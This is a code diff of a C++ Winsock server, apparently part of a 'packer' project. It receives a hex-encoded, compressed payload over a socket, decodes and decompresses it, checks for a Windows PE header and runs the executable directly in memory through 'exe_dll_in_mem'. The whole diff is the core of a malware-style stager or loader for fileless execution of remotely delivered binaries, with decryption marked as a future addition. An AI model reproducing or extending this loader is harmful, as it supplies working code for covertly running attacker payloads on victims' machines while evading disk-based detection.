@@ -21,11 +21,13 @@ sockaddr_in Addr;
 sockaddr_in IncomingAddress;
 int AddressLen = sizeof(IncomingAddress);
 
+//main lifting of the code
 int udp_server_clinet(int Port)
 {
-    //server
-    WSAStartup(MAKEWORD(2, 2), &Winsock);    // Start Winsock
-    if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)    // Check version
+    //server - start Winsock
+    WSAStartup(MAKEWORD(2, 2), &Winsock);
+    // Check version
+    if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)
     {
         WSACleanup();
         return 0;
@@ -49,19 +51,21 @@ int udp_server_clinet(int Port)
 
     if (Sub = accept(Socket, (sockaddr*)&IncomingAddress, &AddressLen))
     {
-        //char* ClientIP = inet_ntoa(IncomingAddress.sin_addr);
-        int ClientPort = ntohs(IncomingAddress.sin_port);
         printf("Client connected!\n");
-        //printf("IP: %s:%d\n", ClientIP, ClientPort);
         printf("Receiving file... \n");
 
+        //declare variables
+        int ClientPort = ntohs(IncomingAddress.sin_port);
+        //char* ClientIP = inet_ntoa(IncomingAddress.sin_addr);
         int Size;
         char* Filesize = new char[1024];
+        int Offset = 0;
+        int n = 0;
 
         if (recv(Sub, Filesize, 1024, 0)) // File size
         {
             Size = atoi((const char*)Filesize);
-			Size = Size - 1; //offset //Todo might have to remove the -1
+			Size = Size - 1; //offset
             printf("Recieved file size: %d\n", Size);
         }
         else {
@@ -69,85 +73,41 @@ int udp_server_clinet(int Port)
                 return 0;
         }
 
+        //now that we have size, can create buffers
         char* Buffer = new char[Size];
 		char* Buffer2 = new char[(Size/2)];
 		unsigned char* DecompressedBuffer = new unsigned char[(Size*2)];  // make it larger since it has to decompress?
 
-        int Offset = 0;
-        int n = 0;
+        //recieve data into Buffer
         while ((n = ::recv(Sub, Buffer + Offset, Size - Offset, 0)) > 0)
 		{
             Offset += n;
         }
-        /*while (Size > Offset)
-        {
-            int Amount = recv(Socket, Buffer + Offset, Size - Offset, 0);
 
-            if (Amount <= 0)
-            {
+        //printf("Hex recieved from packer:\n%s\n", Buffer);
 
-                break;
-            }
-            else
-            {
-                Offset += Amount;
-                printf("2\n");
-            }
-        }*/
-        
-
-		//before manipulation 
-        printf("Hex recieved from packer:\n%s\n", Buffer);
-		char* Buffer_without_padding = new char[(Size)];
-		memcpy(Buffer_without_padding, Buffer, (Size));
-        printf("umm\n");
-		//printf("Buffer without padding:\n%s\n", Buffer_without_padding);
-
+        //change hexstring back into bytes
 		bool odd = 0;
 		string tmp;
 		int x = 0;
 		for (int i = 0; i < Size; i=i+1)
 		{
-			//printf("%i ",i);
 			tmp = "";
-			//printf("%i", odd);
-			
-			//printf("%c ", Buffer[i]);
 			tmp = Buffer[i];
-			if (odd)
-			{
-				//printf("\n");
-			}
 			odd = !odd;
 			if (i + 1 < Size)
 			{
 				i++;
-				//printf("%i ", i);
-				//printf("%c ", Buffer[i]);
 				tmp = tmp + Buffer[i];
-				if (odd)
-				{
-					//printf("\n");
-				}
 				odd = !odd;
-				cout << tmp;
-				//printf("\n");
 			}
 
 			Buffer2[x] = strtoul(tmp.c_str(), NULL, 16);
-			//printf("\n%c\n", strtoul(tmp.c_str(), NULL, 16));
 			x++;
-
-			
 		}
-		printf("\nRecieved data from packer translated back to raw:\n");
-		cout << Buffer2;
-		printf("\n");
-
-        //FILE* File;
-        //fopen_s(&File,"E://Git/test-rec.txt", "wb");
-        //fwrite(Buffer, 1, Size, File);
-        //fclose(File);
+		//printf("\nRecieved data from packer translated back to raw:\n");
+		//cout << Buffer2;
+		//printf("\n");
 
         closesocket(Socket);
         closesocket(Sub);
@@ -159,40 +119,28 @@ int udp_server_clinet(int Port)
         //ToDo decryption
         //decryption();
 
-        //decompression ------------------------------------------------------------------------------------------
-        //ToDo change decompression from file to buffer input
-        //char* opBuf = new char[sizeof(Buffer)];
+        //decompression ---------------------------------------------------------------------------------------
         long decompressed_size;
-        decompressed_size = uziphelp(Buffer2, DecompressedBuffer, (Size/2));
-        printf("decompressed size: %d", decompressed_size);
-		printf("Decompressed file:\n");
-		cout << DecompressedBuffer;
-		printf("\n");
+        decompressed_size = uziphelp(Buffer2, DecompressedBuffer, (Size/2)); //decompression function
+		//printf("Decompressed file:\n");
+		//cout << DecompressedBuffer;
+		//printf("\n");
 
-        int big = Size*2; //ToDo - grab actual size of decompressed data
-
+        //execute in memory ------------------------------------------------------------------------------------
+        //ToDo only execute in memory on (1) flag and (2) if it really is a PE as detected here.
         if (DecompressedBuffer[0] == 77) {
             if (DecompressedBuffer[1] == 90) {
-                printf("\n\nDetected PE executable!\n\n");
+                printf("Detected PE executable!\n");
             }
         }
 
-        /*
-        unsigned char rawData[Size];
-        for (int i = 0; i < 36864; ++i) {
-            rawData[i] = DecompressedBuffer[i];
-            printf("%02X", rawData[i]);
-        }
-        */
-
+        //in-memory execution
         exe_dll_in_mem(DecompressedBuffer, decompressed_size); //ToDo
 
 		//we should have done this earlier
 		free(Buffer);
 		free(Buffer2);
-		free(Buffer_without_padding);
 		free(Filesize);
         return 0;
-
     }
 }
